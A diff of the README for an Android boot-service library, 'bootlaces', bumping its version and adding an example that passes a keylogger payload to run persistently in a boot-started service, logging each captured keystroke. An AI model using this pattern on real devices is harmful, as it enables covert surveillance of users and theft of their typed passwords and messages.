@@ -14,7 +14,7 @@ allprojects {
 2. Add the dependency to your app's build.gradle
 ```gradle
 dependencies {
-        implementation 'com.github.evilthreads669966:bootlaces:2.1'
+        implementation 'com.github.evilthreads669966:bootlaces:3.1'
         //if you are using LifecycleBootService you need to include this library        
         implementation 'androidx.lifecycle:lifecycle-service:2.2.0'
 }
@@ -59,6 +59,16 @@ bootService(this){
         notificationContent = "Evil Threads loves you!"
     }
 }
+
+//if you want to pass a payload to run off the main thread in your service then supply a function as an argument to bootService
+//this only works if you're using LifecycleBootService
+bootService(ctx, payload = {
+    Keylogger.subscribe(this){ entry ->
+    	Log.d("KEYLOGGER", entry.toString())
+    }
+}){
+    service = LockService::class
+}
 ```
 7. Update your notification by passing any context as an argument to bootNotificaton and then initializing its' properties inside of the lambda.
 ```kotlin
@@ -67,6 +77,8 @@ bootNotification(ctx){
     notificationContent = "Evil Threads hates you!"
 }
 ```
+## Important To Know
+- You can pass a suspendsion function as an argument for a payoad to run in LifecycleBootService
 ## Ask a Question?
 - Use [Github issues](https://github.com/evilthreads669966/bootlaces/issues)
 - Send an email to evilthreads669966@gmail.com
